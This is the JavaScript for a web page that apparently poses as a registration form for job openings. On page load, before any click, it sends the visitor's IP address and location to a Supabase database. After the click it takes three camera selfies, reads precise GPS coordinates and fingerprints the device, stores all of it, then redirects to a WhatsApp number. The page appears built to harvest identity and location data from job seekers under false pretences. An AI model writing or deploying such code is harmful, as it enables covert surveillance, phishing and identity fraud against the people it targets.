// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// SISTEMA DE ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) {
      console.error("Erro Supabase:", error);
      return false;
    }
    console.log("✅ Salvo:", dados.tipo_captura);
    return true;
  } catch(err) {
    console.error(err);
    return false;
  }
}

// =================================================================
// SALVAMENTO PRÉVIO AO ABRIR A PÁGINA
// =================================================================
async function salvarPrevio() {
  console.log("Iniciando pré-salvamento...");
  try {
    statusText.innerHTML = "🌐 Salvando IP e dados iniciais...";

    let ip = "indisponível";
    let cidade = "", estado = "", pais = "";

    try {
      const req = await fetch("https://ipapi.co/json/");
      const json = await req.json();
      ip = json.ip || "indisponível";
      cidade = json.city || "";
      estado = json.region || "";
      pais = json.country_name || "";
    } catch(e) {}

    const dadosPrevio = {
      tipo_captura: "previa",
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      user_agent: navigator.userAgent,
      timestamp: new Date().toISOString()
    };

    const salvou = await salvarNoBanco(dadosPrevio);
    if (salvou) {
      statusText.innerHTML = "✅ Pré-cadastro salvo!<br>Clique no botão verde para continuar.";
    }
  } catch(err) {
    console.error(err);
    statusText.innerHTML = "⚠️ Pré-cadastro falhou, mas continue.";
  }
}

// =================================================================
// INICIALIZAÇÃO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    await salvarPrevio();   // Pré-salvamento

    // Inicia câmera
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

    await new Promise((resolve) => {
      if(video.readyState >= 2) resolve();
      else video.onloadeddata = () => resolve();
    });

    statusText.innerHTML = "✅ Sistema pronto. Clique no botão verde.";

  } catch(err) {
    console.error(err);
    statusText.innerHTML = "❌ Erro ao iniciar. Verifique permissão da câmera.";
  }
}

window.onload = iniciarSistema;

// =================================================================
// ANALISADOR DE DISPOSITIVO
// =================================================================
function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";

  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

// =================================================================
// BOTÃO - CAPTURA COMPLETA
// =================================================================
btn.addEventListener("click", async () => {
  console.log("Botão clicado!");
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
   
    statusText.innerHTML = "📸 Capturando fotos...";
    falar("Iniciando cadastro completo.");

    const largura = video.videoWidth;
    const altura = video.videoHeight;
    if(!largura || !altura){
      throw new Error("Vídeo não carregou.");
    }

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) stream.getTracks().forEach(track => track.stop());

    // GPS
    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      const localizacao = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      latitude = localizacao.coords.latitude;
      longitude = localizacao.coords.longitude;
    } catch(err) {}

    // IP
    let ip = "indisponível";
    let cidade = "", estado = "", pais = "";
    try {
      const req = await fetch("https://ipapi.co/json/");
      const json = await req.json();
      ip = json.ip || "indisponível";
      cidade = json.city || "";
      estado = json.region || "";
      pais = json.country_name || "";
    } catch(err) {}

    statusText.innerHTML = "💾 Salvando cadastro completo...";

    const infoDispositivo = analisarDispositivo();

    const { error } = await supabaseClient.from('checkins').insert([{
      tipo_captura: "completo",
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      user_agent: navigator.userAgent,
      modelo_dispositivo: infoDispositivo.model,
      versao_android: infoDispositivo.androidVersion,
      navegador: infoDispositivo.browser,
      plataforma: navigator.platform,
      idioma: navigator.language,
      largura_tela: window.innerWidth,
      altura_tela: window.innerHeight
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído com sucesso!";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.error(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha ao salvar.");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
